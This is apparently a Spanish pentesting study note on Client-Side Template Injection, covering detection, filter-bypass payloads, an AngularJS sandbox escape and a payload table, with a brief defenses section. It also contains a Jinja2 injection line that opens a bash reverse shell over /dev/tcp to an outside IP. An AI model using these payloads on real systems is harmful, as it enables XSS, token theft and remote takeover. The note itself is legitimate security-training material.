---

---
---
Tags: #web #template #csti #xss #js #bypass

---
# Definición
[[CSTI - Client-Side Template Injection]] ocurre cuando una aplicación web permite que un atacante inyecte y ejecute código JavaScript en un motor de plantillas **renderizado en el navegador del cliente**, como **AngularJS**, **Handlebars**, **Vue.js**, entre otros.

> [!warning] Riesgo principal:  
> Permite **XSS**, robo de tokens, modificación del DOM o incluso RCE si se usa junto con SSRF/LFI/etc.

---
## 🧪 ¿Cómo detectar CSTI?

1. Introducir payloads simples como:
  ```js
  {{7*7}}, {{constructor.constructor('alert(1)')()}}
```
    
2. Ver si el resultado aparece **evaluado (49)** o **no escapado** en el DOM o en el HTML.
    
3. Usar Burp o DevTools para inspeccionar la respuesta o el renderizado.
    

> [!tip] ¡OJO!  
> Si el payload se refleja sin ejecutarse, puede haber **CSTI reflejado** pero **filtrado** → prueba **bypass**.

---

## 🧬 Tipos de Motores de Plantillas en Cliente

|Motor|Sintaxis CSTI|Comentario|
|---|---|---|
|**AngularJS**|`{{7*7}}`, `{{constructor.constructor(...)}}`|El más vulnerable a RCE/XSS|
|Handlebars|`{{7}}`, `{{lookup this "key"}}`|Menos peligroso si no se evalúa|
|Vue.js|`{{variable}}`|Menor impacto si no evalúa funciones|
|EJS|`<%= variable %>`|Similar a SSR, pero puede reflejar|

---

## 🔍 Búsqueda de vulnerabilidades

|Técnica|Descripción|
|---|---|
|Reflected Payload|Envías `{{7*7}}` en campos visibles (nombre, comentarios, URL, etc.)|
|DOM Injection|Manipulas el DOM con payloads en `location.hash`, `?query`, `localStorage`|
|Debugging DevTools|Inspeccionas si los datos se evalúan con motores (`eval`, `Function`, etc.)|

---
## 🧨 Explotación Básica

`{{7*7}}` → 49 
`{{"a".constructor.prototype.charAt=[].join;}}` → tampering `{{constructor.constructor('alert(1)')()}}` → XSS

> [!info] AngularJS RCE:  
> Si detectas Angular 1.x:
> 
> `{{constructor.constructor('alert(1)')()}}`

---
## 🧰 Técnicas de Bypass

### 🔤 Codificación con `String.fromCharCode`

Para evitar filtros de palabras como `alert`, `onerror`, etc.

```js
{{[].join.constructor.fromCharCode(97,108,101,114,116)(1)}}
```
### 🧪 Char-by-char encoding

```js
String.fromCharCode(120,61,49) → x=1 String.fromCharCode.apply(null,[97,108,101,114,116])
```
 → alert

### 💥 AngularJS Sandbox Escape
```js
{{a=toString.constructor,a('alert(1)')()}}
```

---

## 🧬 CSTI + RCE (Con SSRF/LFI)

En algunos casos combinados con LFI/RFI se puede obtener RCE real:

```js
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.1.180/8000 0>&1"').read() }}
```

---
## 📋 Tabla de Payloads útiles

|Payload básico|Descripción|
|---|---|
|`{{7*7}}`|Test de ejecución básica|
|`{{constructor.constructor('alert(1)')()}}`|RCE en Angular|
|`{{[].join.constructor("alert(1)")()}}`|Bypass constructor|
|`{{"a".sub.constructor("alert(1)")()}}`|Alternativa a join|
|`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read()}}`|Python Jinja2|

---
## 🧱 Medidas de protección

|Defensa|Descripción|
|---|---|
|Escape/encode de datos|Usar `{{ variable|
|Content Security Policy (CSP)|Prevenir ejecución de scripts no autorizados|
|No usar plantillas en el cliente innecesarias|Evita motores inseguros|
|Saneamiento de entrada|Escapar antes de interpolar cualquier variable|

---
## 🛠 Herramientas útiles

|Herramienta|Descripción|
|---|---|
|**tplmap**|Explotación de SSTI/CSTI (Python)|
|**Burp Suite + Intruder**|Automatizar payloads|
|**DOM Invader (PortSwigger)**|Detectar sinks DOM y ataques client-side|
